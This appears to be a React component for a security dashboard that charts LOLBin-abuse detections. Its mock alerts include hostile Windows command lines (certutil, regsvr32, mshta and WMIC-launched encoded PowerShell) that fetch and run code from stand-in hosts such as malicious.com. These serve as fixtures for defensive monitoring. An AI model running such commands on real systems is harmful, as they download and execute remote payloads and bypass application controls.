import React, { useState, useEffect } from 'react';
import { BarChart, Bar, XAxis, YAxis, Tooltip, Legend, ResponsiveContainer, 
         PieChart, Pie, Cell, LineChart, Line, CartesianGrid } from 'recharts';

const AlertDashboard = () => {
  const [data, setData] = useState({ alerts: [], summary: {}, performance: {} });
  const [loading, setLoading] = useState(true);
  const [timeRange, setTimeRange] = useState('week');
  
  const COLORS = ['#0088FE', '#00C49F', '#FFBB28', '#FF8042', '#8884d8'];
  const SEVERITY_COLORS = {
    1: '#3498db', // Low
    2: '#2ecc71', // Medium-Low
    3: '#f39c12', // Medium
    4: '#e67e22', // Medium-High
    5: '#e74c3c'  // High
  };
  
  // Fetch data effect
  useEffect(() => {
    const fetchData = async () => {
      try {
        setLoading(true);
        // In a real implementation, this would be a fetch from your API
        // For demo purposes, we're using mock data based on your project files
        
        // Simulate API data fetch delay
        await new Promise(resolve => setTimeout(resolve, 500));
        
        // This would be the actual API call in production
        // const response = await fetch('/api/dashboard/data');
        // const jsonData = await response.json();
        
        // Using sample data from your project files
        const mockData = {
          alerts: [
            {
              timestamp: "2025-03-10 12:39:18",
              rule_name: "CertUtil Download",
              description: "CertUtil used to download files from internet",
              severity: 4,
              process_name: "certutil.exe",
              command_line: "certutil.exe -urlcache -f http://malicious.com/payload.exe C:\\temp\\harmless.exe",
              pid: 1001,
              username: "test_user"
            },
            {
              timestamp: "2025-03-10 12:39:19",
              rule_name: "PowerShell Encoded Command",
              description: "PowerShell executing encoded commands",
              severity: 4,
              process_name: "powershell.exe",
              command_line: "powershell.exe -EncodedCommand JABjAGw...",
              pid: 1002,
              username: "test_user"
            },
            {
              timestamp: "2025-03-10 12:39:19",
              rule_name: "Regsvr32 AppLocker Bypass",
              description: "Regsvr32 used to bypass AppLocker",
              severity: 5,
              process_name: "regsvr32.exe",
              command_line: "regsvr32.exe /s /u /i:http://example.com/file.sct scrobj.dll",
              pid: 1003,
              username: "test_user"
            },
            {
              timestamp: "2025-03-10 12:39:20",
              rule_name: "MSHTA Suspicious Execution",
              description: "MSHTA executing remote or encoded script",
              severity: 4,
              process_name: "mshta.exe",
              command_line: "mshta.exe javascript:a=GetObject(\"script:http://malicious.com/code.sct\").Exec();close();",
              pid: 1004,
              username: "test_user"
            },
            {
              timestamp: "2025-03-10 12:39:21",
              rule_name: "WMIC Process Creation",
              description: "WMIC used to create process",
              severity: 3,
              process_name: "wmic.exe",
              command_line: "wmic.exe process call create powershell.exe -enc JABjAGwAaQBlAG4AdAA=",
              pid: 1005,
              username: "test_user"
            }
          ],
          summary: {
            total_alerts: 5,
            high_severity_alerts: 3,
            recent_alerts: 5,
            most_common_lolbin: "powershell.exe",
            most_triggered_rule: "PowerShell Encoded Command"
          },
          performance: {
            system: {
              avg_cpu_percent: 6.1,
              avg_memory_percent: 67.1
            },
            ids: {
              total_processes_analyzed: 10,
              total_alerts_generated: 5,
              avg_execution_time_ms: 0.36,
              top_triggered_rules: {
                "CertUtil Download": 1,
                "PowerShell Encoded Command": 1,
                "Regsvr32 AppLocker Bypass": 1,
                "MSHTA Suspicious Execution": 1,
                "WMIC Process Creation": 1
              }
            }
          }
        };
        
        setData(mockData);
        setLoading(false);
      } catch (error) {
        console.error("Error fetching dashboard data:", error);
        setLoading(false);
      }
    };
    
    fetchData();
  }, [timeRange]);
  
  // Prepare data for the charts
  const prepareChartData = () => {
    // LOLBin distribution chart
    const lolbinCounts = {};
    data.alerts.forEach(alert => {
      lolbinCounts[alert.process_name] = (lolbinCounts[alert.process_name] || 0) + 1;
    });
    
    const lolbinData = Object.entries(lolbinCounts).map(([name, value]) => ({
      name: name.replace('.exe', ''),
      value
    }));
    
    // Severity distribution chart
    const severityCounts = {1: 0, 2: 0, 3: 0, 4: 0, 5: 0};
    data.alerts.forEach(alert => {
      severityCounts[alert.severity] = (severityCounts[alert.severity] || 0) + 1;
    });
    
    const severityData = Object.entries(severityCounts).map(([severity, count]) => ({
      name: getSeverityName(parseInt(severity)),
      value: count,
      severity: parseInt(severity)
    }));
    
    // Rule triggered chart
    const ruleData = data.performance?.ids?.top_triggered_rules 
      ? Object.entries(data.performance.ids.top_triggered_rules).map(([name, count]) => ({
          name,
          count
        }))
      : [];
    
    return { lolbinData, severityData, ruleData };
  };
  
  const getSeverityName = (severity) => {
    switch(severity) {
      case 1: return 'Low';
      case 2: return 'Medium-Low';
      case 3: return 'Medium';
      case 4: return 'Medium-High';
      case 5: return 'High';
      default: return 'Unknown';
    }
  };
  
  const { lolbinData, severityData, ruleData } = prepareChartData();
  
  if (loading) {
    return <div className="flex justify-center items-center h-64">
      <div className="text-2xl text-blue-500">Loading dashboard data...</div>
    </div>;
  }
  
  return (
    <div className="bg-gray-800 text-white p-6 rounded-lg shadow-lg">
      {/* Header with time range selector */}
      <div className="flex justify-between items-center mb-6">
        <h2 className="text-2xl font-bold">Security Dashboard</h2>
        <div className="flex space-x-2">
          <button 
            className={`px-3 py-1 rounded ${timeRange === 'day' ? 'bg-blue-600' : 'bg-gray-700'}`}
            onClick={() => setTimeRange('day')}
          >
            24h
          </button>
          <button 
            className={`px-3 py-1 rounded ${timeRange === 'week' ? 'bg-blue-600' : 'bg-gray-700'}`}
            onClick={() => setTimeRange('week')}
          >
            Week
          </button>
          <button 
            className={`px-3 py-1 rounded ${timeRange === 'month' ? 'bg-blue-600' : 'bg-gray-700'}`}
            onClick={() => setTimeRange('month')}
          >
            Month
          </button>
        </div>
      </div>
      
      {/* Summary cards */}
      <div className="grid grid-cols-1 md:grid-cols-4 gap-4 mb-6">
        <div className="bg-gray-700 p-4 rounded-lg">
          <div className="text-sm text-gray-400">Total Alerts</div>
          <div className="text-2xl font-bold">{data.summary.total_alerts || 0}</div>
        </div>
        <div className="bg-gray-700 p-4 rounded-lg">
          <div className="text-sm text-gray-400">High Severity</div>
          <div className="text-2xl font-bold text-red-500">{data.summary.high_severity_alerts || 0}</div>
        </div>
        <div className="bg-gray-700 p-4 rounded-lg">
          <div className="text-sm text-gray-400">Recent (24h)</div>
          <div className="text-2xl font-bold">{data.summary.recent_alerts || 0}</div>
        </div>
        <div className="bg-gray-700 p-4 rounded-lg">
          <div className="text-sm text-gray-400">Avg. Analysis Time</div>
          <div className="text-2xl font-bold">{data.performance?.ids?.avg_execution_time_ms || 0} ms</div>
        </div>
      </div>
      
      {/* Charts section */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
        {/* LOLBin Distribution */}
        <div className="bg-gray-700 p-4 rounded-lg">
          <h3 className="text-lg font-bold mb-4">LOLBin Distribution</h3>
          <div className="h-64">
            <ResponsiveContainer width="100%" height="100%">
              <BarChart data={lolbinData}>
                <CartesianGrid strokeDasharray="3 3" stroke="#444" />
                <XAxis dataKey="name" stroke="#ccc" />
                <YAxis stroke="#ccc" />
                <Tooltip 
                  contentStyle={{ backgroundColor: '#333', border: 'none' }}
                  labelStyle={{ color: '#ccc' }}
                />
                <Bar dataKey="value" fill="#3498db" />
              </BarChart>
            </ResponsiveContainer>
          </div>
        </div>
        
        {/* Severity Distribution */}
        <div className="bg-gray-700 p-4 rounded-lg">
          <h3 className="text-lg font-bold mb-4">Severity Distribution</h3>
          <div className="h-64">
            <ResponsiveContainer width="100%" height="100%">
              <PieChart>
                <Pie
                  data={severityData}
                  cx="50%"
                  cy="50%"
                  outerRadius={80}
                  fill="#8884d8"
                  dataKey="value"
                  nameKey="name"
                  label={({ name, percent }) => `${name} ${(percent * 100).toFixed(0)}%`}
                >
                  {severityData.map((entry) => (
                    <Cell key={`cell-${entry.name}`} fill={SEVERITY_COLORS[entry.severity]} />
                  ))}
                </Pie>
                <Tooltip
                  contentStyle={{ backgroundColor: '#333', border: 'none' }}
                  formatter={(value, name) => [value, name]}
                />
              </PieChart>
            </ResponsiveContainer>
          </div>
        </div>
      </div>
      
      {/* Recent alerts table */}
      <div className="bg-gray-700 p-4 rounded-lg">
        <h3 className="text-lg font-bold mb-4">Recent Alerts</h3>
        <div className="overflow-auto">
          <table className="min-w-full bg-gray-800 rounded-lg">
            <thead>
              <tr>
                <th className="px-4 py-2 text-left">Severity</th>
                <th className="px-4 py-2 text-left">Timestamp</th>
                <th className="px-4 py-2 text-left">Rule</th>
                <th className="px-4 py-2 text-left">Process</th>
                <th className="px-4 py-2 text-left">User</th>
              </tr>
            </thead>
            <tbody>
              {data.alerts.map((alert, index) => (
                <tr key={index} className="border-t border-gray-700 hover:bg-gray-700">
                  <td className="px-4 py-2">
                    <span 
                      className="inline-block w-8 h-8 rounded-full flex items-center justify-center text-white font-bold"
                      style={{ backgroundColor: SEVERITY_COLORS[alert.severity] }}
                    >
                      {alert.severity}
                    </span>
                  </td>
                  <td className="px-4 py-2">{alert.timestamp}</td>
                  <td className="px-4 py-2">{alert.rule_name}</td>
                  <td className="px-4 py-2">{alert.process_name}</td>
                  <td className="px-4 py-2">{alert.username}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
};

export default AlertDashboard;